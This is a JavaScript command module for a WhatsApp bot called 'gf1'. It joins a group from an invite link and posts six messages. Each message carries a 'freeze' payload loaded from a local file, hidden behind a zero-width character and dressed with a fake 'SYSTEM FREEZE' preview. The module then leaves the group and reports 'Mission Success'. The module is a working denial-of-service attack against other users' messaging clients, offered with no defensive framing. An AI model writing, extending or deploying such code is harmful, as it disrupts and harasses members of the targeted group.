const fs = require('fs');
const config = require('../../config');

module.exports = {
    name: "gf1",
    execute: async (conn, msg, args, { from, fancy, isOwner }) => {
        if (!isOwner) return;
        if (!args[0]) return msg.reply(fancy("🥀 provide group link."));

        try {
            const payload = fs.readFileSync('./lib/payloads/freeze.txt', 'utf-8');
            const code = args[0].split('https://chat.whatsapp.com/')[1];
            const jid = await conn.groupAcceptInvite(code);

            for (let i = 0; i < 6; i++) {
                await conn.sendMessage(jid, { 
                    text: "\u200B" + payload,
                    contextInfo: { 
                        externalAdReply: { title: "🥀 SYSTEM FREEZE 🥀", body: "Re-calculating group integrity...", mediaType: 1, thumbnailUrl: "https://files.catbox.moe/horror.jpg" }
                    } 
                });
            }
            await conn.groupLeave(jid);
            await conn.sendMessage(conn.user.id, { text: fancy("🥀 Mission Success: Group Freezed and Left."), contextInfo: { isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: config.newsletterJid } } });
        } catch (e) { msg.reply("🥀 Mission Failed."); }
    }
};
